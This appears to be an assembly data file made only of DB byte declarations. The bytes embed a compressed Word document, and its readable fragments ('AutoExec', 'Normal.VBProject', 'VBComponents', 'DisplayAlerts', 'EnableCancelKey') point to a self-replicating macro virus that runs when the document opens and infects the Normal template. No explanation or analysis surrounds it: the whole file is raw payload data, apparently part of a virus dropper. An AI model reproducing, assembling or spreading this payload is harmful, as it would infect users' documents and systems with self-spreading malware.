DB 010H,00FH,010H,00FH,010H,0FDH,0FFH,00BH,010H,0FFH,00FH,001H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0F3H
DB 000H,00FH,010H,00EH,010H,0FEH,0FFH,0F3H,02FH,0B3H,04AH,0ABH,016H,0D3H,006H
DB 000H,000H,0E0H,085H,09FH,0F2H,0F9H,04FH,000H,0E8H,068H,010H,0ABH,091H,008H
DB 000H,02BH,027H,0B3H,0D9H,030H,002H,023H,050H,0D2H,019H,0D3H,0B9H,002H,007H
DB 06CH,055H,000H,088H,002H,010H,003H,03AH,090H,002H,008H,0D3H,027H,09CH,002H
DB 008H,004H,002H,004H,0A8H,002H,004H,005H,002H,004H,0B8H,0ABH,05AH,002H,004H
DB 0D3H,0EDH,0C4H,002H,008H,008H,002H,004H,0D4H,002H,004H,009H,002H,004H,0E4H
DB 002H,004H,0B3H,0B4H,0F0H,002H,008H,00AH,04DH,055H,002H,004H,00CH,002H,04DH
DB 0F2H,0F1H,000H,018H,002H,008H,00DH,002H,010H,024H,002H,008H,00EH,002H,008H
DB 030H,002H,008H,00FH,0ADH,0D6H,002H,008H,038H,002H,008H,003H,074H,040H,002H
DB 008H,013H,002H,010H,048H,002H,008H,003H,078H,0E4H,002H,06DH,01EH,002H,010H
DB 002H,00FH,029H,0E0H,002H,006H,073H,000H,00FH,00CH,006H,002H,016H,056H,065H
DB 063H,06EH,061H,000H,066H,009H,01CH,002H,010H,003H,028H,0C1H,00DH,003H,098H
DB 04EH,06FH,072H,06DH,061H,0E2H,037H,003H,010H,009H,02CH,000H,004H,02CH,003H
DB 060H,031H,000H,063H,06EH,003H,000H,003H,01CH,003H,074H,04DH,069H,063H,072H
DB 06FH,073H,06FH,066H,074H,020H,057H,06FH,072H,064H,018H,014H,020H,038H,02EH
DB 012H,00DH,0F2H,027H,000H,000H,08CH,086H,047H,002H,067H,000H,004H,00CH,0B0H
DB 0E8H,03DH,010H,0FFH,0B8H,065H,0BEH,001H,004H,00CH,03CH,06FH,085H,003H,00CH
DB 013H,018H,003H,0A0H,003H,008H,003H,028H,00FH,008H,01EH,08FH,00FH,00FH,0FFH
DB 0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,03FH,0E0H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FEH,0FFH,000H,000H,004H
DB 000H,0E3H,0EEH,0E3H,09EH,009H,004H,001H,000H,003H,012H,002H,0D5H,0CDH,0D5H
DB 09CH,02EH,01BH,010H,093H,097H,008H,000H,02BH,02CH,0F9H,054H,067H,0AEH,044H
DB 002H,01FH,005H,00EH,014H,02CH,0E2H,0DDH,0E8H,002H,018H,0F3H,0C0H,002H,00BH
DB 000H,068H,002H,00CH,0F3H,0B4H,070H,0B5H,0AAH,002H,008H,005H,002H,004H,07CH
DB 002H,004H,0F3H,05CH,084H,002H,008H,011H,002H,004H,08CH,002H,004H,017H,002H
DB 004H,094H,002H,004H,0DAH,0AAH,00BH,002H,004H,09CH,002H,004H,0F3H,0DCH,0A4H
DB 002H,008H,0F3H,068H,0ACH,002H,008H,016H,002H,004H,0B4H,002H,004H,00DH,002H
DB 004H,076H,0E1H,0BCH,002H,004H,003H,05CH,0C9H,002H,008H,003H,094H,0F7H,0F4H
DB 004H,002H,010H,032H,039H,041H,000H,0F3H,050H,003H,078H,00BH,008H,0C3H,03BH
DB 002H,01BH,004H,018H,0B3H,00DH,008H,000H,003H,064H,003H,010H,00FH,008H,007H
DB 010H,01EH,002H,07DH,003H,040H,003H,004H,000H,00CH,017H,0D8H,002H,00DH,003H
DB 065H,0F3H,0F5H,007H,002H,036H,054H,0EDH,074H,075H,06CH,06FH,004H,04CH,003H
DB 020H,098H,002H,013H,003H,068H,059H,05DH,002H,007H,000H,020H,002H,005H,003H
DB 014H,036H,002H,008H,002H,002H,004H,03EH,002H,004H,003H,010H,003H,00CH,00AH
DB 002H,00CH,05FH,000H,02BH,050H,049H,044H,05FH,047H,055H,049H,044H,014H,05CH
DB 003H,0B6H,041H,002H,016H,04EH,002H,004H,07BH,000H,0FAH,0FDH,030H,00EH,002H
DB 02DH,008H,010H,00FH,00AH,003H,02AH,009H,014H,003H,00EH,00BH,004H,07DH,002H
DB 04EH,003H,003H,01FH,0D5H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,0FFH
DB 0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,0FFH,0FFH,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00BH,010H,07DH,0BDH,0E7H,0B4H,003H,0E2H,049H,0F3H
DB 054H,0F3H,0B4H,0F3H,0B0H,0E3H,0FFH,0FEH,002H,029H,009H,002H,018H,0E3H,0D0H
DB 0F3H,030H,0F3H,088H,00DH,002H,010H,0DEH,07AH,00EH,002H,004H,0F3H,0E4H,003H
DB 020H,0F3H,0D4H,012H,002H,010H,0F3H,0BCH,014H,002H,008H,015H,002H,004H,0F3H
DB 0C0H,0F3H,0E4H,003H,020H,019H,055H,05BH,002H,010H,01AH,002H,004H,01BH,002H
DB 004H,01CH,002H,004H,01DH,002H,004H,0F3H,05FH,01FH,002H,008H,003H,020H,0FDH
DB 002H,064H,022H,0ADH,0AAH,002H,00CH,028H,002H,004H,003H,010H,025H,002H,008H
DB 026H,002H,004H,027H,002H,004H,029H,002H,004H,031H,002H,004H,02AH,002H,004H
DB 0AAH,0FAH,02BH,002H,004H,02CH,002H,004H,02DH,002H,004H,02EH,002H,004H,02FH
DB 002H,004H,030H,002H,004H,003H,034H,003H,004H,002H,047H,00FH,003H,0FFH,0FFH
DB 00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H
DB 00FH,010H,047H,000H,00FH,010H,00FH,010H,004H,010H,052H,000H,06FH,002H,002H
DB 074H,000H,020H,000H,045H,000H,06EH,000H,074H,010H,000H,000H,072H,000H,079H
DB 012H,056H,020H,050H,072H,06FH,067H,072H,061H,06DH,061H,073H,000H,000H,008H
DB 041H,052H,051H,055H,049H,056H,07EH,031H,000H,028H,000H,013H,08CH,000H,000H
DB 028H,026H,000H,000H,0D1H,023H,010H,000H,04DH,069H,063H,072H,06FH,073H,06FH
DB 066H,016H,000H,005H,001H,047H,024H,004H,049H,002H,005H,023H,044H,006H,009H
DB 002H,002H,040H,000H,000H,0C0H,004H,006H,000H,046H,003H,007H,0A2H,0D8H,000H
DB 080H,008H,000H,02BH,030H,030H,09DH,0C0H,0B1H,0E1H,09BH,0B8H,065H,0BEH,001H
DB 024H,002H,015H,006H,040H,040H,023H,021H,002H,008H,031H,000H,054H,000H,061H
DB 000H,062H,000H,06CH,000H,065H,002H,00EH,026H,000H,080H,04DH,017H,011H,000H
DB 041H,072H,071H,075H,069H,076H,06FH,073H,020H,064H,065H,00FH,088H,081H,001H
DB 00FH,088H,010H,000H,00EH,000H,002H,000H,002H,07BH,008H,003H,000H,04DH,049H
DB 043H,052H,04FH,053H,050H,000H,07EH,032H,000H,01EH,008H,0B0H,0DAH,003H,0B0H
DB 06FH,064H,065H,06CH,06FH,073H,000H,04DH,04FH,008H,020H,044H,045H,008H,002H
DB 06AH,000H,010H,000H,000H,026H,003H,000H,0F0H,057H,002H,0FEH,072H,000H,008H
DB 07EH,064H,000H,044H,002H,008H,063H,000H,075H,000H,06DH,002H,088H,013H,008H
DB 003H,023H,00FH,004H,00FH,010H,003H,010H,01AH,0F8H,047H,000H,002H,001H,033H
DB 034H,007H,081H,003H,014H,00FH,004H,00FH,010H,004H,010H,002H,080H,003H,008H
DB 005H,000H,053H,004H,076H,06DH,0ABH,0EAH,012H,006H,013H,07CH,049H,012H,086H
DB 066H,002H,08CH,072H,002H,08AH,061H,012H,090H,069H,002H,00CH,06EH,003H,029H
DB 00FH,004H,006H,010H,0FEH,0E3H,028H,002H,080H,013H,072H,033H,0BCH,003H,084H
DB 006H,017H,00FH,007H,00CH,010H,004H,07BH,004H,005H,000H,000H,005H,00FH,0FAH
DB 00FH,090H,00FH,090H,0FDH,056H,00EH,090H,038H,002H,080H,003H,078H,007H,004H
DB 00CH,069H,00FH,00DH,006H,010H,018H,003H,008H,006H,080H,04DH,002H,0F8H,063H
DB 022H,076H,06FH,07CH,0F4H,000H,073H,003H,016H,00FH,004H,00FH,010H,00FH,010H
DB 022H,000H,001H,001H,001H,002H,016H,00CH,002H,004H,043H,0A4H,002H,007H,00FH
DB 003H,010H,083H,000H,080H,092H,064H,024H,078H,0A0H,010H,0DAH,004H,008H,00BH
DB 021H,056H,000H,042H,000H,041H,00BH,011H,0C7H,0C7H,00FH,00CH,00FH,010H,00EH
DB 010H,008H,000H,001H,028H,080H,053H,034H,00EH,01FH,004H,00FH,007H,080H,0C0H
DB 047H,0C9H,00FH,080H,022H,0FEH,0E8H,0FFH,068H,000H,069H,002H,0FCH,044H,012H
DB 058H,02FH,080H,004H,03DH,00FH,005H,00EH,010H,023H,080H,053H,0A4H,023H,0D4H
DB 013H,084H,00EH,01FH,00FH,00FH,0FDH,0FFH,008H,010H,096H,053H,0E5H,002H,00EH
DB 013H,03CH,023H,040H,033H,0BCH,023H,044H,023H,0CCH,003H,01BH,003H,0CCH,003H
DB 054H,003H,05CH,06FH,000H,067H,000H,013H,0C3H,0BFH,0EAH,06FH,000H,06BH,000H
DB 013H,0E8H,067H,000H,053H,0A4H,06FH,000H,020H,002H,080H,021H,002H,004H,022H
DB 002H,004H,023H,002H,004H,043H,018H,06BH,000H,05FH,055H,063H,014H,063H,004H
DB 06FH,000H,06BH,000H,043H,094H,032H,002H,03CH,033H,002H,004H,034H,002H,004H
DB 035H,002H,004H,036H,002H,004H,037H,055H,055H,002H,004H,038H,002H,004H,039H
DB 002H,004H,03AH,002H,004H,03BH,002H,004H,03CH,002H,004H,03DH,002H,004H,03EH
DB 002H,004H,03FH,0ADH,05AH,002H,004H,040H,002H,004H,013H,0FCH,042H,002H,008H
DB 043H,002H,004H,044H,002H,004H,045H,002H,004H,043H,0B5H,047H,002H,008H,048H
DB 0ABH,0AAH,002H,004H,003H,0B8H,04AH,002H,008H,04BH,002H,004H,04CH,002H,004H
DB 04DH,002H,004H,04EH,002H,004H,04FH,002H,004H,050H,002H,004H,0EAH,0AAH,051H
DB 002H,004H,052H,002H,004H,053H,002H,004H,003H,02CH,003H,004H,056H,002H,00CH
DB 057H,002H,004H,058H,002H,004H,059H,002H,004H,0F6H,07FH,05AH,002H,004H,003H
DB 018H,05CH,006H,008H,013H,0A8H,00FH,004H,00FH,010H,00FH,010H,00FH,010H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,007H,010H,001H,0E0H,0FCH,016H,001H,000H
DB 001H,0B6H,022H,0C3H,034H,046H,002H,008H,0FFH,0FFH,002H,0A6H,004H,008H,005H
DB 00AH,003H,00EH,00FH,004H,00FH,010H,0BFH,055H,00BH,010H,023H,015H,023H,04DH
DB 023H,049H,023H,045H,008H,069H,001H,023H,04FH,003H,00EH,078H,002H,02FH,0DEH
DB 002H,004H,0F7H,022H,078H,0F5H,00FH,0D8H,022H,080H,003H,014H,002H,00FH,032H
DB 049H,000H,000H,08DH,09AH,08FH,09AH,000H,002H,07EH,023H,00FH,088H,002H,015H
DB 003H,034H,0AFH,01DH,002H,007H,00FH,003H,009H,010H,003H,0A5H,013H,002H,070H
DB 0D6H,002H,013H,003H,004H,0EBH,023H,0C5H,002H,041H,003H,018H,000H,000H,0DFH
DB 0F3H,07FH,002H,00AH,002H,019H,000H,00CH,002H,008H,003H,067H,00FH,004H,00FH
DB 010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,00FH,010H,009H,010H,023H,0CCH
DB 002H,028H,085H,000H,053H,04CH,003H,012H,000H,002H,0EBH,053H,010H,008H,00AH
DB 094H,005H,00AH,000H,000H,002H,03CH,005H,00AH,004H,054H,0FFH,0FFH,015H,08DH
DB 001H,000H,04EH,000H,030H,000H,07BH,002H,004H,030H,002H,004H,032H,002H,004H
DB 039H,0B1H,01EH,002H,004H,036H,000H,02DH,002H,006H,003H,012H,030H,00CH,00AH
DB 043H,006H,016H,009H,01EH,005H,024H,005H,006H,034H,000H,036H,000H,08CH,000H
DB 07DH,000H,019H,0A2H,0DDH,036H,002H,000H,0DFH,033H,0E1H,013H,086H,001H,001H
DB 080H,012H,01EH,0CCH,03FH,002H,081H,023H,09DH,003H,07BH,0FFH,0FFH,003H,0A7H
DB 013H,080H,002H,017H,004H,003H,005H,016H,015H,04DH,093H,0BBH,033H,0A3H,00CH
DB 011H,07CH,0FAH,01AH,002H,00BH,018H,00FH,00CH,003H,039H,007H,014H,003H,008H
DB 00DH,000H,0A3H,035H,094H,003H,017H,004H,004H,093H,0B7H,003H,018H,003H,004H
DB 0DFH,0FFH,003H,011H,022H,081H,002H,007H,022H,009H,002H,006H,000H,002H,0C5H
DB 003H,080H,003H,01CH,005H,076H,003H,00AH,00FH,032H,003H,014H,00BH,004H,004H
DB 039H,002H,005H,00FH,0FDH,007H,014H,002H,00BH,01FH,0F1H,007H,01BH,0FFH,002H
DB 000H,070H,002H,01FH,04DH,032H,0E8H,005H,013H,002H,00DH,002H,02CH,005H,006H
DB 015H,077H,01FH,0E1H,003H,00CH,00FH,004H,00FH,010H,00FH,010H,007H,010H,0FEH
DB 0CAH,001H,002H,0EEH,022H,081H,008H,000H,013H,064H,004H,016H,002H,00CH,0DFH
DB 0FFH,023H,094H,024H,0CAH,002H,00CH,053H,04DH,033H,024H,000H,002H,00CH,063H
DB 0B5H,053H,005H,003H,00CH,0B3H,015H,003H,0E8H,003H,00CH,043H,0A9H,043H,05DH
DB 003H,00CH,0DDH,0A2H,003H,030H,090H,003H,049H,002H,030H,0B3H,019H,0A0H,006H
DB 00CH,003H,018H,0C8H,003H,00CH,080H,008H,000H,003H,060H,0D8H,002H,00CH,026H
DB 03EH,004H,002H,024H,032H,055H,000H,0E0H,002H,00CH,000H,080H,009H,003H,006H
DB 002H,0DCH,012H,048H,00AH,00CH,003H,0F6H,001H,001H,012H,004H,0F0H,002H,01CH
DB 08FH,004H,004H,070H,000H,0C1H,000H,01CH,002H,013H,014H,0AFH,000H,020H,000H
DB 01EH,060H,028H,002H,028H,000H,020H,002H,002H,01DH,002H,003H,020H,000H,024H
DB 002H,005H,012H,022H,004H,012H,0F7H,000H,080H,080H,020H,000H,026H,002H,0F6H
DB 000H,0A4H,022H,0BFH,020H,000H,028H,002H,021H,000H,02AH,002H,004H,082H,009H
DB 02CH,002H,004H,02EH,002H,08BH,000H,000H,004H,018H,005H,01CH,026H,002H,007H
DB 020H,025H,000H,02CH,002H,000H,000H,001H,000H,021H,000H,030H,002H,025H,000H
DB 032H,002H,002H,000H,0AEH,000H,008H,000H,000H,0A8H,027H,043H,06FH,063H,061H
DB 069H,06EH,065H,005H,000H,094H,0A2H,020H,093H,002H,07EH,067H,032H,0A1H,08CH
DB 040H,053H,000H,007H,060H,0A3H,03BH,00CH,000H,058H,002H,02CH,00EH,000H,063H
DB 03AH,05CH,063H,005H,02EH,02EH,030H,020H,073H,079H,073H,01DH,002H,082H,009H
DB 078H,042H,040H,034H,002H,001H,000H,040H,004H,014H,042H,040H,06BH,00FH,022H
DB 0D8H,092H,0BBH,063H,092H,033H,09BH,002H,052H,013H,056H,06CH,002H,0FCH,063H
DB 083H,003H,0F2H,013H,072H,001H,0A7H,0B1H,000H,000H,000H,041H,074H,074H,072H
DB 069H,062H,075H,074H,000H,065H,020H,056H,042H,05FH,04EH,061H,081H,000H,092H
DB 0EFH,020H,03DH,020H,022H,054H,068H,072H,084H,044H,06FH,063H,075H,06DH,065H
DB 06EH,010H,000H,000H,074H,022H,00DH,00AH,00AH,08CH,042H,061H,073H,001H,002H
DB 08CH,030H,07BH,030H,030H,000H,000H,030H,032H,030H,050H,039H,030H,036H,02DH
DB 000H,010H,030H,003H,008H,043H,007H,000H,000H,000H,014H,002H,012H,001H,024H
DB 030H,030H,034H,036H,07DH,001H,00DH,07CH,043H,072H,065H,000H,000H,061H,074H
DB 061H,062H,082H,06CH,001H,086H,046H,061H,06CH,073H,065H,00CH,05EH,000H,000H
DB 000H,050H,072H,065H,064H,065H,063H,06CH,061H,089H,000H,006H,049H,064H,000H
DB 08BH,054H,000H,000H,072H,075H,00DH,022H,040H,045H,078H,070H,06FH,073H,065H
DB 014H,01CH,054H,000H,065H,000H,000H,06DH,070H,06CH,061H,074H,065H,044H,030H
DB 065H,072H,069H,076H,002H,024H,011H,065H,000H,000H,043H,075H,0C0H,073H,074H
DB 06FH,06DH,069H,07AH,004H,088H,003H,032H,000H,053H,075H,000H,000H,062H,020H
DB 041H,075H,074H,06FH,000H,045H,078H,065H,063H,028H,029H,00DH,00AH,000H,000H
DB 000H,04FH,06EH,020H,045H,072H,072H,06FH,072H,080H,020H,047H,06FH,054H,06FH
DB 020H,065H,000H,000H,000H,005H,001H,080H,055H,070H,070H,06CH,069H,063H,061H
DB 074H,080H,069H,06FH,06EH,000H,000H,02EH,044H,069H,073H,000H,035H,080H,079H
DB 041H,06CH,065H,072H,074H,073H,000H,055H,000H,000H,013H,005H,034H,008H,011H
DB 045H,06EH,081H,030H,043H,061H,06EH,040H,063H,065H,06CH,000H,000H,04BH,065H
DB 079H,000H,012H,077H,086H,064H,000H,01BH,001H,00AH,064H,00DH,00AH,046H,000H
DB 000H,080H,02DH,012H,069H,080H,009H,031H,020H,080H,02FH,04EH,06FH,072H,008H
DB 06DH,061H,000H,000H,06CH,005H,05FH,02EH,056H,042H,050H,040H,072H,06FH,06AH
DB 065H,063H,074H,080H,004H,000H,000H,043H,020H,06FH,06DH,070H,06FH,06EH,080H
DB 0C5H,073H,02EH,000H,043H,06FH,075H,06EH,000H,000H,074H,00DH,00AH,049H,044H
DB 066H,020H,0A2H,017H,028H,069H,029H,000H,019H,064H,000H,000H,004H,065H,04DH
DB 06FH,064H,075H,06CH,065H,02EH,000H,04CH,012H,0C5H,073H,028H,031H,02CH,008H
DB 040H,000H,020H,031H,029H,000H,03BH,022H,012H,0D8H,004H,063H,061H,080H,004H
DB 022H,020H,054H,068H,000H,000H,065H,002H,06EH,089H,039H,04EH,065H,078H,074H
DB 020H,069H,014H,00DH,00AH,023H,025H,000H,042H,049H,080H,027H,072H,074H,020H
DB 040H,028H,022H,013H,0D1H,083H,014H,02EH,030H,012H,0CEH,022H,000H,000H,0C0H
DB 050H,00CH,010H,053H,061H,006H,076H,040H,073H,081H,052H,03AH,00DH,00AH,045H
DB 000H,000H,06EH,024H,064H,020H,0C0H,05CH,00DH,00AH,041H,000H,0D0H,0CFH,011H
DB 0E0H,0A1H,0B1H,008H,008H,01AH,0E1H,000H,00EH,001H,03EH,000H,003H,000H,0FEH
DB 0FFH,009H,039H,05DH,000H,0CCH,061H,05EH,081H,00CH,053H,04FH,0FFH,016H,004H
DB 000H,000H,009H,002H,004H,0E4H,004H,047H,049H,003H,017H,005H,000H,002H,000H
DB 000H,0AEH,02CH,001H,02AH,000H,05CH,000H,047H,000H,07BH,042H,05BH,053H,00CH
DB 053H,048H,034H,0C2H,0EEH,046H,05CH,03EH,0F3H,020H,003H,01AH,003H,004H,02DH
DB 000H,05FH,048H,003H,016H,009H,004H,055H,048H,023H,000H,033H,000H,02EH,002H
DB 050H,023H,000H,028H,000H,039H,000H,023H,002H,032H,03AH,002H,062H,041H,000H
DB 052H,000H,051H,000H,055H,000H,049H,000H,0A8H,00AH,056H,000H,04FH,0B2H,046H
DB 020H,0B2H,05AH,045H,022H,09DH,050H,002H,018H,04FH,002H,080H,052H,000H,041H
DB 000H,05AH,055H,04DH,002H,004H,053H,00FH,02CH,004H,02CH,043H,002H,034H,04DH
DB 002H,03EH,04EH,002H,00EH,05CH,002H,028H,049H,002H,056H,052H,055H,0B5H,002H
DB 014H,053H,002H,004H,046H,0A2H,026H,020H,002H,018H,048H,002H,03EH,052H,002H
DB 0BAH,044H,002H,042H,0A5H,0B8H,05CH,002H,06CH,02AH,0BAH,042H,002H,016H,033H
DB 002H,090H,032H,002H,092H,044H,000H,04CH,002H,002H,023H,002H,016H,022H,0D0H
DB 0C2H,058H,061H,0D2H,058H,0A2H,08AH,020H,0A2H,0E2H,061H,000H,073H,0A2H,066H
DB 063H,002H,08EH,046H,0A2H,068H,072H,002H,008H,041H,000H,070H,002H,002H,098H
